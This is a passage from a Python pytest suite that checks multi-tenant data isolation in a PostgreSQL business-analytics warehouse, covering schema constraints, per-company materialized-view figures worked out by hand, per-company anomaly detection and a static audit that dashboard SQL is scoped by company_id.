    # anomaly_alerts / forecasts start empty (the detector/forecast tests
    # below manage their own state).
    for table in ("anomaly_alerts", "forecasts"):
        (total,) = fetch_one(conn, f"SELECT COUNT(*) FROM {table}")
        (outside,) = fetch_one(
            conn, f"SELECT COUNT(*) FROM {table}"
                  " WHERE company_id NOT IN (%s, %s)", (co1, co2))
        assert outside == 0, f"{table}: rows outside the two workspaces"


def test_A2_bare_insert_lands_in_company_1_via_default(conn):
    """PINNED TRADE-OFF: company_id is NOT NULL but carries DEFAULT 1, so a
    bare INSERT (no company_id) lands in the DEMO workspace instead of
    failing. Every production writer (seed_demo.py, ingest_csv.py,
    forecast_engine.py, detect_anomalies()) sets company_id explicitly; the
    default is the documented scratch/legacy-writer safety net."""
    co1 = SESSION["co1"]
    with conn.cursor() as cur:
        cur.execute(
            "INSERT INTO customers (name, email) VALUES (%s, %s)"
            " RETURNING company_id",
            ("QAMT-default-tenant", "qamt.default@example.test"))
        landed = cur.fetchone()[0]
        assert landed == co1, (
            f"bare INSERT landed in company {landed}; DEFAULT 1 must put"
            f" unscoped rows in the demo workspace ({co1})")
        # ...and the same for a second client table (spot check)
        cur.execute(
            "INSERT INTO financial_ledger (entry_type, category, entry_date,"
            " amount) VALUES ('expense', 'QAMT-default-cat', %s, 10.00)"
            " RETURNING company_id",
            (datetime.date(2026, 6, 1),))
        assert cur.fetchone()[0] == co1
    conn.commit()
    # cleanup
    with conn.cursor() as cur:
        cur.execute("DELETE FROM customers WHERE email = %s",
                    ("qamt.default@example.test",))
        cur.execute("DELETE FROM financial_ledger WHERE category = %s",
                    ("QAMT-default-cat",))
    conn.commit()


def test_A3_null_company_id_rejected(conn):
    """company_id is NOT NULL on all 8 client tables: an explicit NULL is
    rejected even though a DEFAULT exists."""
    for table, insert in (
        ("customers",
         "INSERT INTO customers (company_id, name, email)"
         " VALUES (NULL, 'QAMT-null', 'qamt.null@example.test')"),
        ("jobs",
         "INSERT INTO jobs (company_id, job_number, customer_id, job_type_id,"
         " job_date, quoted_price) SELECT NULL, 'QAMT-null-job', c.id, t.id,"
         " DATE '2026-06-01', 1.00 FROM customers c, job_types t"
         f" WHERE c.company_id = {SESSION['co1']} AND t.company_id ="
         f" {SESSION['co1']} LIMIT 1"),
        ("forecasts",
         "INSERT INTO forecasts (company_id, series, period_start, model,"
         " predicted, horizon_months) VALUES (NULL, 'revenue',"
         " DATE '2026-07-01', 'QAMT-model', 1.00, 1)"),
    ):
        with conn.cursor() as cur:
            cur.execute("SAVEPOINT qa_mt_null_sp")
            with pytest.raises(psycopg2.errors.NotNullViolation):
                cur.execute(insert)
            cur.execute("ROLLBACK TO SAVEPOINT qa_mt_null_sp")
            cur.execute("RELEASE SAVEPOINT qa_mt_null_sp")


def test_A4_fk_restrict_blocks_deleting_company_with_rows(conn):
    """ON DELETE RESTRICT: a company with dependent history cannot be
    deleted (the warehouse's convention protecting client books); an EMPTY
    company deletes fine."""
    with conn.cursor() as cur:
        cur.execute(
            "INSERT INTO companies (company_name, industry_vertical)"
            " VALUES ('QAMT Throwaway Co', 'qa_fixture')"
            " RETURNING company_id")
        throwaway = cur.fetchone()[0]
        cur.execute(
            "INSERT INTO customers (company_id, name, email)"
            " VALUES (%s, 'QAMT throwaway customer',"
            " 'qamt.throwaway@example.test') RETURNING id",
            (throwaway,))
        cust_id = cur.fetchone()[0]
    conn.commit()

    with pytest.raises(psycopg2.errors.ForeignKeyViolation):
        with conn.cursor() as cur:
            cur.execute("DELETE FROM companies WHERE company_id = %s",
                        (throwaway,))
    conn.rollback()

    # inverse: empty companies CAN be deleted (workspace offboarding works)
    with conn.cursor() as cur:
        cur.execute("DELETE FROM customers WHERE id = %s", (cust_id,))
        cur.execute("DELETE FROM companies WHERE company_id = %s",
                    (throwaway,))
        (gone,) = fetch_one(conn, "SELECT COUNT(*) FROM companies"
                                  " WHERE company_id = %s", (throwaway,))
        assert gone == 0
    conn.commit()


def test_A5_bogus_company_id_fk_rejected(conn):
    """A row referencing a nonexistent workspace is rejected (FK to
    companies) on all 8 client tables."""
    bogus = 987654321
    cases = {
        "customers": ("INSERT INTO customers (company_id, name, email)"
                      " VALUES (%s, 'QAMT-bogus', 'qamt.bogus@example.test')",
                      (bogus,)),
        "job_types": ("INSERT INTO job_types (company_id, name,"
                      " default_hourly_rate) VALUES (%s, 'QAMT-bogus-type',"
                      " 10.00)", (bogus,)),
        "employees": ("INSERT INTO employees (company_id, first_name,"
                      " last_name, email, hire_date, hourly_rate)"
                      " VALUES (%s, 'QA', 'Bogus', 'qamt.bogus2@example.test',"
                      " DATE '2024-01-01', 10.00)", (bogus,)),
        "forecasts": ("INSERT INTO forecasts (company_id, series,"
                      " period_start, model, predicted, horizon_months)"
                      " VALUES (%s, 'revenue', DATE '2026-07-01',"
                      " 'QAMT-model', 1.00, 1)", (bogus,)),
    }
    for table, (sql, params) in cases.items():
        with conn.cursor() as cur:
            cur.execute("SAVEPOINT qa_mt_fk_sp")
            with pytest.raises(psycopg2.errors.ForeignKeyViolation):
                cur.execute(sql, params)
            cur.execute("ROLLBACK TO SAVEPOINT qa_mt_fk_sp")
            cur.execute("RELEASE SAVEPOINT qa_mt_fk_sp")


# ===========================================================================
# B) Matview isolation (hand-computed per company)
# ===========================================================================
def test_B1_mv_job_type_profitability_isolated_and_hand_computed(conn):
    """One row per (company_id, job_type); aggregates NEVER cross companies.
    Hand-computed from the seeded data:

      company 1 'QAMT1 Roofing Services' (J1/J3/J5):
        revenue  9000 + 12000 + 7000      = 28000.00
        materials 950 + 1000 + 1020       =  2970.00
        labor    1000 + 1280 + 820        =  3100.00
        margin   28000 - 2970 - 3100      = 21930.00  (78.32%)
        jobs 3, avg quote (9000+12000+7000)/3 = 9333.33, hours 68
      company 1 'QAMT1 Interior Painting' (J2/J4/J6):
        revenue 2500 (only J6 billed); materials 1050+980+1000 = 3030.00;
        labor 520+340+400 = 1260.00; margin -1790.00 (-71.60%)
      company 2 'QAMT2 Digital Marketing Retainer' (K1/K2):
        revenue 5000 + 3500 = 8500.00; materials 180+220+190+210 (K1) =
        800.00 plus 200+200+800 (K2) = 1200.00 -> type total 2000.00;
        labor 680+510 = 1190.00; total_cost 3190.00; margin 5310.00 (62.47%)
    """
    co1, co2 = SESSION["co1"], SESSION["co2"]
    rows = fetch_dicts(conn, """
        SELECT company_id, job_type, revenue, materials_cost, other_cost,
               labor_cost, total_cost, gross_margin, margin_pct, job_count,
               avg_job_price, labor_hours
          FROM mv_job_type_profitability
         ORDER BY company_id, job_type
    """)
    assert len(rows) == 3, rows
    by_key = {(r["company_id"], r["job_type"]): r for r in rows}

    roof = by_key[(co1, "QAMT1 Roofing Services")]
    assert roof["revenue"] == Decimal("28000.00")
    assert roof["materials_cost"] == Decimal("2970.00")
    assert roof["other_cost"] == Decimal("0.00")
    assert roof["labor_cost"] == Decimal("3100.00")
    assert roof["total_cost"] == Decimal("6070.00")
    assert roof["gross_margin"] == Decimal("21930.00")
    assert roof["margin_pct"] == Decimal("78.32")
    assert roof["job_count"] == 3
    assert roof["avg_job_price"] == Decimal("9333.33")
    assert roof["labor_hours"] == Decimal("68.00")

    paint = by_key[(co1, "QAMT1 Interior Painting")]
    assert paint["revenue"] == Decimal("2500.00")
    assert paint["materials_cost"] == Decimal("3030.00")
    assert paint["labor_cost"] == Decimal("1260.00")
    assert paint["gross_margin"] == Decimal("-1790.00")
    assert paint["margin_pct"] == Decimal("-71.60")
    assert paint["job_count"] == 3
    assert paint["avg_job_price"] == Decimal("3166.67")
    assert paint["labor_hours"] == Decimal("28.00")

    retainer = by_key[(co2, "QAMT2 Digital Marketing Retainer")]
    assert retainer["revenue"] == Decimal("8500.00")
    assert retainer["materials_cost"] == Decimal("2000.00")
    assert retainer["labor_cost"] == Decimal("1190.00")
    assert retainer["total_cost"] == Decimal("3190.00")
    assert retainer["gross_margin"] == Decimal("5310.00")
    assert retainer["margin_pct"] == Decimal("62.47")
    assert retainer["job_count"] == 2
    assert retainer["avg_job_price"] == Decimal("4250.00")
    assert retainer["labor_hours"] == Decimal("14.00")

    # unique index grain: (company_id, job_type_id)
    (idxdef,) = fetch_one(
        conn, "SELECT indexdef FROM pg_indexes WHERE schemaname = 'public'"
              " AND indexname = 'uq_mv_job_type_profitability'")
    assert "(company_id, job_type_id)" in idxdef, idxdef


def test_B2_mv_labor_cost_analysis_isolated_and_hand_computed(conn):
    """One row per (company_id, job) WITH logs -- 6 + 2 rows, each job's
    labor cost coming from ITS OWN workspace's logs:
      J1 22h / $1000 vs est 1200 -> -16.67%, $45.45/hr, crew of 2
      J6  9h /  $400 vs est  400 ->   0.00%, $44.44/hr
      K1  8h /  $680 vs est 1000 -> -32.00%, $85.00/hr
      K2  6h /  $510 vs est  700 -> -27.14%, $85.00/hr
    """
    co1, co2 = SESSION["co1"], SESSION["co2"]
    rows = fetch_dicts(conn, """
        SELECT company_id, job_id, job_number, total_hours, labor_cost,
               estimated_labor_cost, labor_variance_pct, labor_cost_per_hour,
               employee_count
          FROM mv_labor_cost_analysis
         ORDER BY company_id, job_number
    """)
    assert len(rows) == 6 + 2, rows
    by_num = {r["job_number"]: r for r in rows}

    j1 = by_num["QAMT1-JOB-001"]
    assert j1["company_id"] == co1
    assert j1["total_hours"] == Decimal("22.00")
    assert j1["labor_cost"] == Decimal("1000.00")
    assert j1["estimated_labor_cost"] == Decimal("1200.00")
    assert j1["labor_variance_pct"] == Decimal("-16.67")
    assert j1["labor_cost_per_hour"] == Decimal("45.45")
    assert j1["employee_count"] == 2

    j6 = by_num["QAMT1-JOB-006"]
    assert j6["labor_variance_pct"] == Decimal("0.00")
    assert j6["labor_cost_per_hour"] == Decimal("44.44")

    k1 = by_num["QAMT2-JOB-001"]
    assert k1["company_id"] == co2
    assert k1["total_hours"] == Decimal("8.00")
    assert k1["labor_cost"] == Decimal("680.00")
    assert k1["labor_variance_pct"] == Decimal("-32.00")
    assert k1["labor_cost_per_hour"] == Decimal("85.00")
    assert k1["employee_count"] == 1

    k2 = by_num["QAMT2-JOB-002"]
    assert k2["company_id"] == co2
    assert k2["labor_variance_pct"] == Decimal("-27.14")
    assert k2["labor_cost_per_hour"] == Decimal("85.00")

    (idxdef,) = fetch_one(
        conn, "SELECT indexdef FROM pg_indexes WHERE schemaname = 'public'"
              " AND indexname = 'uq_mv_labor_cost_analysis'")
    assert "(company_id, job_id)" in idxdef, idxdef


def test_B3_mv_customer_profitability_per_workspace_whale(conn):
    """Per-(company_id, customer) rows incl. zero-job customers, hand-computed
    job_cost / margin, and the whale flag computed against EACH WORKSPACE'S
    OWN revenue percentile:

      company 1 (revenues 9000/12000/9500 -> p80 = 11000): all margins
        positive -> NO whale. Alpha job_cost = 950+1050 + 1000+520 = 3520.
      company 2 (revenues 5000/3500 -> p80 = 4700): Delta's acquisition cost
        (4500) pushes it negative -> whale; Epsilon (3500 < 4700) not.
      Counterfactual: a GLOBAL p80 over all five customers would be 10000
      and Delta would NOT be a whale -- so this row's existence proves the
      percentile is computed per workspace.
    """
    co1, co2 = SESSION["co1"], SESSION["co2"]
    rows = fetch_dicts(conn, """
        SELECT company_id, customer_name, revenue, job_cost, acquisition_cost,
               total_cost, gross_margin, job_count, is_whale
          FROM mv_customer_profitability
         ORDER BY company_id, customer_name
    """)
    assert len(rows) == 3 + 2, rows
    by_name = {r["customer_name"]: r for r in rows}

    alpha = by_name["QAMT1 Alpha Holdings"]
    assert alpha["company_id"] == co1
    assert alpha["revenue"] == Decimal("9000.00")
    assert alpha["job_cost"] == Decimal("3520.00")
    assert alpha["acquisition_cost"] == Decimal("0.00")
    assert alpha["total_cost"] == Decimal("3520.00")
    assert alpha["gross_margin"] == Decimal("5480.00")
    assert alpha["job_count"] == 2
    assert alpha["is_whale"] is False

    beta = by_name["QAMT1 Beta Ventures"]
    assert beta["job_cost"] == Decimal("3600.00")   # 1000+980 + 1280+340
    assert beta["gross_margin"] == Decimal("8400.00")
    assert beta["is_whale"] is False

    gamma = by_name["QAMT1 Gamma Trading"]
    assert gamma["job_cost"] == Decimal("3240.00")  # 1020+1000 + 820+400
    assert gamma["gross_margin"] == Decimal("6260.00")
    assert gamma["is_whale"] is False

    delta = by_name["QAMT2 Delta Group"]
    assert delta["company_id"] == co2
    assert delta["revenue"] == Decimal("5000.00")
    assert delta["job_cost"] == Decimal("1480.00")    # 800 materials + 680 labor
    assert delta["acquisition_cost"] == Decimal("4500.00")
    assert delta["total_cost"] == Decimal("5980.00")
    assert delta["gross_margin"] == Decimal("-980.00")
    assert delta["is_whale"] is True, (
        "Delta must be a whale under COMPANY 2's own p80 (4700.00); a whale"
        " here would be impossible if the percentile were computed across"
        " workspaces (global p80 = 10000.00)")

    epsilon = by_name["QAMT2 Epsilon Labs"]
    assert epsilon["job_cost"] == Decimal("1710.00")  # 400+800 + 510
    assert epsilon["gross_margin"] == Decimal("1790.00")
    assert epsilon["is_whale"] is False

    # whale population per workspace: company 1 -> 0, company 2 -> 1
    (whales_co1,) = fetch_one(
        conn, "SELECT COUNT(*) FROM mv_customer_profitability"
              " WHERE company_id = %s AND is_whale", (co1,))
    (whales_co2,) = fetch_one(
        conn, "SELECT COUNT(*) FROM mv_customer_profitability"
              " WHERE company_id = %s AND is_whale", (co2,))
    assert (whales_co1, whales_co2) == (0, 1)

    (idxdef,) = fetch_one(
        conn, "SELECT indexdef FROM pg_indexes WHERE schemaname = 'public'"
              " AND indexname = 'uq_mv_customer_profitability'")
    assert "(company_id, customer_id)" in idxdef, idxdef


def test_B4_mv_monthly_summary_both_companies_same_month(conn):
    """One row per (company_id, month); BOTH workspaces get independent rows
    in the SAME calendar month (never merged, never shadowed). Hand-computed:

      company 1 Dec 2025: revenue 9000; materials 950; labor(ledger) 600;
        rent->other 500; total 2050; GP 6950 (77.22%); logs 22h/$1000;
        1 completion; 0 new customers.
      company 1 Feb 2026: revenue 12000; materials 1000; labor 600; rent 520;
        total 2120; GP 9880 (82.33%); 28h/$1280; 1 completion.
      company 2 Feb 2026 (the SAME month): revenue 0; materials 210;
        acquisition 4500 -> other; total 4710; GP -4710; 8h/$680; 1 completion.
      company 2 May 2026: materials spike 800 -> total 800, GP -800.
      The month grid is per workspace: company 1 has a Nov 2025 row created
      ONLY by Alpha's signup (new_customers = 1, all zeros else).
    """
    co1, co2 = SESSION["co1"], SESSION["co2"]
    rows = fetch_dicts(conn, """
        SELECT company_id, month_start, revenue, materials_expense,
               labor_expense_ledger, equipment_expense, other_expense,
               total_expense, labor_hours, labor_cost, gross_profit,
               gross_margin_pct, job_completions, new_customers
          FROM mv_monthly_summary
         ORDER BY company_id, month_start
    """)
    months_co1 = [r for r in rows if r["company_id"] == co1]
    months_co2 = [r for r in rows if r["company_id"] == co2]
    assert len(months_co1) == 7, [r["month_start"] for r in months_co1]
    assert len(months_co2) == 7, [r["month_start"] for r in months_co2]

    by_key = {(r["company_id"], r["month_start"]): r for r in rows}

    d1 = by_key[(co1, datetime.date(2025, 12, 1))]
    assert d1["revenue"] == Decimal("9000.00")
    assert d1["materials_expense"] == Decimal("950.00")
    assert d1["labor_expense_ledger"] == Decimal("600.00")
    assert d1["other_expense"] == Decimal("500.00")
    assert d1["total_expense"] == Decimal("2050.00")
    assert d1["gross_profit"] == Decimal("6950.00")
    assert d1["gross_margin_pct"] == Decimal("77.22")
    assert d1["labor_hours"] == Decimal("22.00")
    assert d1["labor_cost"] == Decimal("1000.00")
    assert d1["job_completions"] == 1
    assert d1["new_customers"] == 0

    f1 = by_key[(co1, datetime.date(2026, 2, 1))]
    assert f1["revenue"] == Decimal("12000.00")
    assert f1["total_expense"] == Decimal("2120.00")
    assert f1["gross_profit"] == Decimal("9880.00")
    assert f1["gross_margin_pct"] == Decimal("82.33")
    assert f1["labor_cost"] == Decimal("1280.00")
    assert f1["job_completions"] == 1

    # SAME month, BOTH companies, independent rows:
    f2 = by_key[(co2, datetime.date(2026, 2, 1))]
    assert f2["company_id"] == co2
    assert f2["revenue"] == Decimal("0.00")
    assert f2["materials_expense"] == Decimal("210.00")
    assert f2["other_expense"] == Decimal("4500.00")   # the acquisition row
    assert f2["total_expense"] == Decimal("4710.00")
    assert f2["gross_profit"] == Decimal("-4710.00")
    assert f2["labor_hours"] == Decimal("8.00")
    assert f2["labor_cost"] == Decimal("680.00")
    assert f2["job_completions"] == 1
    assert f2["new_customers"] == 0

    m2 = by_key[(co2, datetime.date(2026, 5, 1))]
    assert m2["materials_expense"] == Decimal("800.00")
    assert m2["total_expense"] == Decimal("800.00")
    assert m2["gross_profit"] == Decimal("-800.00")
    assert m2["labor_hours"] == Decimal("0.00")

    # workspace-own month grid: company 1's Nov 2025 row exists ONLY because
    # of Alpha's signup (company 2's Nov row comes from its materials row).
    nov1 = by_key[(co1, datetime.date(2025, 11, 1))]
    assert nov1["revenue"] == Decimal("0.00")
    assert nov1["total_expense"] == Decimal("0.00")
    assert nov1["new_customers"] == 1
    nov2 = by_key[(co2, datetime.date(2025, 11, 1))]
    assert nov2["materials_expense"] == Decimal("180.00")
    assert nov2["new_customers"] == 0

    (idxdef,) = fetch_one(
        conn, "SELECT indexdef FROM pg_indexes WHERE schemaname = 'public'"
              " AND indexname = 'uq_mv_monthly_summary'")
    assert "(company_id, month_start)" in idxdef, idxdef


def test_B5_mv_benchmark_comparison_internal_per_company_market_global(conn):
    """mv_benchmark_comparison: the INTERNAL series (blended labor rate,
    materials per job) are PER WORKSPACE while the MARKET columns
    (wage/PPI baselines from market_benchmarks) are identical for both
    companies at the same period (global by design).

      company 1 Dec 2025: rate = (12*50 + 10*40)/22 = 1000/22 = 45.45;
        materials/job = 950.00 (one job). No Dec-2024 history -> internal
        YoY NULL.
      company 2 Dec 2025: NO labor logs in Dec -> rate NULL;
        materials/job = 220.00.
      Market: market_wage_national = 42.00 (seeded 30 + 12) for BOTH;
        market YoY = (42/30 - 1)*100 = 40.00 for BOTH.
    """
    co1, co2 = SESSION["co1"], SESSION["co2"]
    dec1, dec2 = fetch_one(conn, """
        SELECT internal_labor_rate, internal_labor_hours,
               internal_materials_per_job, market_wage_national,
               market_wage_national_yoy_pct, ppi_lumber
          FROM mv_benchmark_comparison
         WHERE company_id = %s AND period = DATE '2025-12-01'
    """, (co1,)), fetch_one(conn, """
        SELECT internal_labor_rate, internal_labor_hours,
               internal_materials_per_job, market_wage_national,
               market_wage_national_yoy_pct, ppi_lumber
          FROM mv_benchmark_comparison
         WHERE company_id = %s AND period = DATE '2025-12-01'
    """, (co2,))
    assert dec1[0] == Decimal("45.45")
    assert dec1[1] == Decimal("22.00")
    assert dec1[2] == Decimal("950.00")
    assert dec2[0] is None, "company 2 has no Dec labor logs"
    assert dec2[2] == Decimal("220.00")

    # GLOBAL market columns: identical for both workspaces
    assert dec1[3] == dec2[3] == Decimal("42.00")
    assert dec1[4] == dec2[4] == Decimal("40.00")
    assert dec1[5] == dec2[5] == Decimal("112.00")   # 100 + 12

    # a month where both companies HAVE labor: Apr 2026
    #   co1: (10*50 + 8*40)/18 = 820/18 = 45.56
    #   co2: (6*85)/6 = 85.00
    apr = fetch_all(conn, """
        SELECT company_id, internal_labor_rate
          FROM mv_benchmark_comparison
         WHERE period = DATE '2026-04-01' ORDER BY company_id
    """)
    assert {r[0]: r[1] for r in apr} == {
        co1: Decimal("45.56"), co2: Decimal("85.00")}

    # month grids are per workspace: company 2 has Nov 2025 (its materials
    # history starts a month earlier), company 1 does not.
    (nov_co1,) = fetch_one(
        conn, "SELECT COUNT(*) FROM mv_benchmark_comparison"
              " WHERE company_id = %s AND period = DATE '2025-11-01'", (co1,))
    (nov_co2,) = fetch_one(
        conn, "SELECT COUNT(*) FROM mv_benchmark_comparison"
              " WHERE company_id = %s AND period = DATE '2025-11-01'", (co2,))
    assert (nov_co1, nov_co2) == (0, 1)

    (idxdef,) = fetch_one(
        conn, "SELECT indexdef FROM pg_indexes WHERE schemaname = 'public'"
              " AND indexname = 'uq_mv_benchmark_comparison'")
    assert "(company_id, period)" in idxdef, idxdef

    # mv_socal_rate_guidance stays GLOBAL: no company_id column at all
    (n,) = fetch_one(
        conn, "SELECT COUNT(*) FROM information_schema.columns"
              " WHERE table_name = 'mv_socal_rate_guidance'"
              " AND column_name = 'company_id'")
    assert n == 0, "mv_socal_rate_guidance must stay global (no company_id)"


# ===========================================================================
# C) detect_anomalies() per-company correctness (the critical proof)
# ===========================================================================
def test_C1_detector_no_cross_contamination(conn):
    """THE critical multi-tenant proof.

    company 1's materials history is STEADY ~1000/mo (950, 1050, 1000, 980,
    1020, 1000 -> last-month prior mean 1000, stddev 38.08) and company 2's
    is a DIFFERENT steady history ~200/mo (180, 220, 190, 210, 200, 200 ->
    mean 200.00, STDDEV_SAMP sqrt(200) = 14.14), with ONE 800 spike in May
    2026 -- the SAME category ('materials') and the SAME month as company 1's
    materials.

    detect_anomalies() must:
      * raise EXACTLY ONE expense_spike across the whole warehouse,
      * attach it to company 2 (company_id = 2),
      * compute the baseline from COMPANY 2's history ONLY:
          prior_6m_mean = 200.00  (a mixed baseline would be ~600+)
          prior_6m_stddev = 14.14 (rounded from sqrt(200))
          z = (800 - 200) / 14.14 = 42.43 -> severity 'high'
        (if the statistics had blended the two businesses, the mean would be
        ~600+, the spike would NOT have fired, and/or the alert would carry
        the wrong workspace),
      * raise NO alert at all for company 1 (its books are steady by design:
        materials/rent stay within 2 sigma, payroll is constant -> stddev 0
        -> skipped, labor stays under estimate).
    """
    co1, co2 = SESSION["co1"], SESSION["co2"]
    (alerts_before,) = fetch_one(
        conn, "SELECT COUNT(*) FROM anomaly_alerts")
    assert alerts_before == 0

    rows = fetch_dicts(conn, "SELECT * FROM detect_anomalies()")
    conn.commit()
    spikes = [r for r in rows if r["out_anomaly_type"] == "expense_spike"]
    overruns = [r for r in rows if r["out_anomaly_type"] == "labor_overrun"]
    assert overruns == [], overruns
    assert len(spikes) == 1, (
        f"expected exactly 1 expense_spike across BOTH workspaces, got"
        f" {rows!r}")
    sp = spikes[0]
    assert sp["out_subject"] == "materials - May 2026"
    assert sp["out_severity"] == "high"
    assert sp["out_metric_value"] == Decimal("800.00")
    assert sp["out_baseline_value"] == Decimal("200.00")
    assert sp["out_z_score"] == Decimal("42.43")
    assert sp["out_deviation_pct"] == Decimal("300.00")
    details = sp["out_details"]
    assert abs(float(details["prior_6m_mean"]) - 200.0) < 0.005, details
    assert abs(float(details["prior_6m_stddev"]) - 14.14) < 0.005, details
    assert details["prior_months_counted"] == 6

    # the stored alert carries COMPANY 2's workspace id -- and company 1's
    # books produced NOTHING:
    stored = fetch_one(conn, """
        SELECT company_id, category, period, metric_value, baseline_value
          FROM anomaly_alerts WHERE id = %s
    """, (sp["out_alert_id"],))
    assert stored[0] == co2, f"alert belongs to company {stored[0]}, not {co2}"
    assert stored[1] == "materials"
    assert stored[2] == datetime.date(2026, 5, 1)
    (n_co1,) = fetch_one(conn, "SELECT COUNT(*) FROM anomaly_alerts"
                               " WHERE company_id = %s", (co1,))
    assert n_co1 == 0, "company 1 must raise NO alert (steady books)"

    # idempotency is per company too: a second call inserts NOTHING new.
    rows2 = fetch_dicts(conn, "SELECT * FROM detect_anomalies()")
    conn.commit()
    assert rows2 == [], rows2


def test_C2_same_spike_in_both_companies_two_alerts(conn):
    """The per-company partial unique indexes: the SAME spike (identical
    category, values and month) planted in BOTH workspaces yields TWO open
    alerts -- one per company -- with no ON CONFLICT collision. Cleanup
    restores the pre-test state."""
    co1, co2 = SESSION["co1"], SESSION["co2"]
    shared_cat = "QAMT-shared-spike-cat"
    # 5 varied steady months + one 400 spike in May 2026, planted in BOTH
    # workspaces (identical values):
    values = [50.00, 150.00, 100.00, 100.00, 100.00]
    days = [datetime.date(2025, 12, 3), datetime.date(2026, 1, 3),
            datetime.date(2026, 2, 3), datetime.date(2026, 3, 3),
            datetime.date(2026, 4, 3)]
    try:
        with conn.cursor() as cur:
            for co in (co1, co2):
                for day, amount in zip(days, values):
                    cur.execute(
                        "INSERT INTO financial_ledger (company_id, entry_type,"
                        " category, entry_date, amount, vendor)"
                        " VALUES (%s, 'expense', %s, %s, %s, %s)",
                        (co, shared_cat, day, amount, "QAMT-vendor"))
                cur.execute(
                    "INSERT INTO financial_ledger (company_id, entry_type,"
                    " category, entry_date, amount, vendor)"
                    " VALUES (%s, 'expense', %s, %s, 400.00, %s)",
                    (co, shared_cat, datetime.date(2026, 5, 3), "QAMT-vendor"))
        conn.commit()

        rows = fetch_dicts(conn, "SELECT * FROM detect_anomalies()")
        conn.commit()
        shared = [r for r in rows
                  if r["out_details"].get("category") == shared_cat]
        assert len(shared) == 2, (
            f"the same spike in both workspaces must yield 2 alerts (one per"
            f" company), got {rows!r}")
        assert {r["out_details"]["category"] for r in shared} == {shared_cat}
        # same category + same period, one row per company, no collision:
        assert all(r["out_anomaly_type"] == "expense_spike" for r in shared)
        stored = fetch_all(conn, """
            SELECT company_id, category, period
              FROM anomaly_alerts
             WHERE category = %s AND period = DATE '2026-05-01'
             ORDER BY company_id
        """, (shared_cat,))
        assert stored == [(co1, shared_cat, datetime.date(2026, 5, 1)),
                          (co2, shared_cat, datetime.date(2026, 5, 1))], stored
        assert all(r["out_severity"] == "high" for r in shared)
    finally:
        # restore: remove the planted rows AND the two alerts they created
        with conn.cursor() as cur:
            cur.execute("DELETE FROM anomaly_alerts WHERE category = %s",
                        (shared_cat,))
            cur.execute("DELETE FROM financial_ledger WHERE category = %s",
                        (shared_cat,))
        conn.commit()
        (back,) = fetch_one(conn, "SELECT COUNT(*) FROM anomaly_alerts")
        assert back == 1, back   # only C1's company-2 materials spike remains


# ===========================================================================
# D) Tab-level isolation
# ===========================================================================
def _app_source():
    global APP_PY_SOURCE
    if APP_PY_SOURCE is None:
        with open(APP_PATH, "r", encoding="utf-8") as fh:
            APP_PY_SOURCE = fh.read()
    return APP_PY_SOURCE


def _extract_qdf_sql_calls(source):
    """AST-extract every qdf()/qdf_params() SQL argument in app.py.
    Returns a list of (sql_text, is_fstring). f-Strings contribute their
    constant parts (the interpolated parts are widget-selected values that
    only ever come from the data itself)."""
    tree = ast.parse(source)
    found = []

    def literal_parts(node):
        if isinstance(node, ast.Constant) and isinstance(node.value, str):
            return node.value, False
        if isinstance(node, ast.JoinedStr):
            parts = []
            for v in node.values:
                if isinstance(v, ast.Constant) and isinstance(v.value, str):
                    parts.append(v.value)
            return "".join(parts), True
        return None, False

    for node in ast.walk(tree):
        if isinstance(node, ast.Call) and isinstance(node.func, ast.Name) \
                and node.func.id in ("qdf", "qdf_params"):
            if node.args:
                text, is_f = literal_parts(node.args[0])
                if text:
                    found.append((text, is_f))
    return found


CLIENT_TABLE_RE_CACHE = None


def _client_relations_in(sql_lower_norm):
    """Which of the 8 client tables / 5 scoped matviews does this SQL touch
    (word-boundary match, so 'job_number' never matches 'jobs')?"""
    import re as _re
    touched = []
    for rel in CLIENT_TABLES + SCOPED_MATVIEWS:
        if _re.search(rf"(?i)\b{rel}\b", sql_lower_norm):
            touched.append(rel)
    return touched


def test_D1_static_audit_app_sql_company_predicates(conn):
    """STATIC AUDIT of the dashboard: every qdf/qdf_params query in app.py
    that touches one of the 8 client tables or one of the 5 company-scoped
    matviews MUST contain a company_id predicate. Zero violations expected.

    Legitimate exceptions (verified, not just allowed): queries that touch
    ONLY the companies registry (the workspace selector + duplicate-name
    check) or ONLY global/market data (backtest_results, SoCal tables,
    mv_socal_rate_guidance, regional_industry_profiles,
    public_peer_financials, mv_vertical_financial_quartiles,
    socal_capital_events) -- none of those carry client books."""
    source = _app_source()
    calls = _extract_qdf_sql_calls(source)
    assert len(calls) >= 15, f"unexpectedly few qdf calls found: {len(calls)}"
    violations = []
    exempt = []
    for sql, is_f in calls:
        touched = _client_relations_in(sql)
        if not touched:
            exempt.append(sql)
            continue
        if "company_id" not in sql.lower():
            violations.append((touched, sql))
    assert violations == [], (
        "dashboard queries touching client data WITHOUT a company_id"
        f" predicate: {violations!r}")
    # the exempt set must stay clean: no exempt query may sneak a client
    # table in via a spelling variant (belt & suspenders on the audit itself)
    for sql in exempt:
        assert "mv_monthly_summary" not in sql or "company_id" in sql.lower()


def test_D2_static_audit_engines_and_pdf_company_predicates(conn):
    """The other multi-tenant writers/readers pass the same static audit:
    generate_pdf_brief.py (every query company-scoped), forecast_engine.py
    (all 4 MONTHLY_SQL series queries + the per-company upsert key) and
    ingest_csv.py (workspace-scoped FK lookups + the company_id backfill)."""
    # --- generate_pdf_brief.py: every SQL string touching client data is
    # scoped. (SQL strings are triple-quoted constants inside _q calls.)
    with open(os.path.join(_BASE_DIR, "generate_pdf_brief.py"),
              encoding="utf-8") as fh:
        gpdf_source = fh.read()
    gpdf_violations = []
    tree = ast.parse(gpdf_source)
    for node in ast.walk(tree):
        if isinstance(node, ast.Constant) and isinstance(node.value, str) \
                and "\n" in node.value and "SELECT" in node.value:
            sql = node.value
            touched = _client_relations_in(sql)
            if touched and "company_id" not in sql.lower():
                gpdf_violations.append((touched, sql))
    assert gpdf_violations == [], (
        f"generate_pdf_brief.py has unscoped client-data SQL: {gpdf_violations!r}")
    # the company row itself is fetched by id:
    assert "WHERE company_id = %s" in gpdf_source

    # --- forecast_engine.py: the 4 series queries + upsert key
    assert len(fe.MONTHLY_SQL) == 4
    for series, sql in fe.MONTHLY_SQL.items():
        assert "company_id = %s" in sql, (series, sql)
    assert "(company_id, series, period_start, model)" in fe.FORECAST_UPSERT_SQL
    # backtest_results stays GLOBAL by design (no company_id in its upsert)
    assert "company_id" not in fe.BACKTEST_UPSERT_SQL

    # --- ingest_csv.py: scoped FK lookups + explicit company_id backfill
    with open(os.path.join(_BASE_DIR, "ingest_csv.py"), encoding="utf-8") as fh:
        ing_source = fh.read()
